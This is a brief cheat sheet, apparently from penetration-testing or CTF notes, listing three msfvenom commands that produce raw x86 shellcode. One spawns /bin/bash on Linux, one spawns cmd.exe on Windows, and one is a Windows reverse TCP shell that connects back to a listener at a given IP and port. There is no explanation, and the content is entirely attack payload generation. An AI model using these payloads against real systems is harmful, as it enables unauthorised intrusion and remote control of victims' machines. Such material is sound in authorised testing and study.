- Linux
```bash
msfvenom -a x86 -platform linux -p linux/x86/exec CMD='/bin/bash' -f raw -o exploit.txt [-b '\xba\xdc']
```

- Windows 
```bash
msfvenom -a x86 -platform windows -p windows/exec CMD='cmd.exe' -f raw -o exploit.txt [-b '\xba\xdc']
```

```bash
msfvenom -a x86 -platform windows -p windows/shell_reverse_tcp LHOST=$ip LPORT=$port -f raw -o exploit.txt [-b '\xba\xdc']
```